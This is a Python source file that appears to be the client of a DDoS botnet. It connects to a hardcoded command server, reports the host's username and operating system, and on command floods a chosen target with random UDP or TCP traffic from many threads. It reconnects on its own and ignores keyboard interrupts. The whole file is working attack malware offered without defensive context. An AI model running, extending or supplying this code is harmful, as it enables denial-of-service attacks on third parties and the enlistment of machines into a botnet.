# horribly written, old socket file rewritten from a year ago

import socket, signal, os, sys, random, datetime
from threading import Thread
from time import time, sleep

windows = os.name == 'nt'
operating_sys = "WIN" if windows else "LINUX"
username = os.getlogin() if windows else os.system('whoami')

def attack_tcp(ip, port, sec, workers):
	endTime = datetime.datetime.now() + datetime.timedelta(minutes=sec)
	while True:
		if datetime.datetime.now() >= endTime:
			break
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((ip, port))
			while datetime.datetime.now() < endTime:
				s.send(random._urandom(workers))
		except:
			pass


class Client:

	def __init__(self, connect: tuple=("192.168.0.37", 5000)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)

		self.stop = False
		self.run = False

		while not self.stop:
			try:
				self._connect(connect)
			except KeyboardInterrupt:
				continue
			except:
				sleep(10)

	def exit_gracefully(self,signum, frame):
		self.stop = True
		self.run = False
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect) -> None:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect(connect)
		self.listen_for_commands()

	def __ddos(self, *args):

		def dos(*args):
			t1=time()
			host,port=args[1],args[2]

			s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			bytes=random._urandom(10240)
			s.connect((host, int(port)))

			while self.run:
				if not self.run:break
				s.sendto(bytes, (host,int(port)))

			s.close()

		for _ in range(int(args[4])):
			Thread(target = dos,args=[*args]).start()

		sleep(int(args[3]))
		self.run=False

	def _recv(self):
		return self.sock.recv(1024).decode("ascii").lower()

	def listen_for_commands(self):
		system_information = f"{username}|{operating_sys}"
		self.sock.send(system_information.encode())

		while True:
			data = self._recv()
			if "attack" in data:
				if "udp" in data:

					data=data.replace("attack ","").split()

					try:
						proto, attackip, port, sec, workers = data
						data = proto, attackip, int(port), int(sec), int(workers)
						self.sock.send("finished-udp".encode("ascii"))
					except Exception as e:
						self.sock.send("exception:{}".format(e).encode("ascii"))
						continue

					self.run=True
					Thread(target = self.__ddos,args=data).start()

				elif "tcp" in data:
					args = data.split(' ')
					ip = args[2]
					port = int(args[3])
					sec = int(args[4])
					workers = int(args[5])
					attack_tcp(ip, port, sec, workers)

			elif "kill" in data:
				self.run=False
				self.sock.send(str.encode("killing client"))
				self.sock.close()

			elif "ping" in data:
				self.sock.send(str.encode("heartbeat"))
			else: pass


if __name__ == '__main__':
	Client()
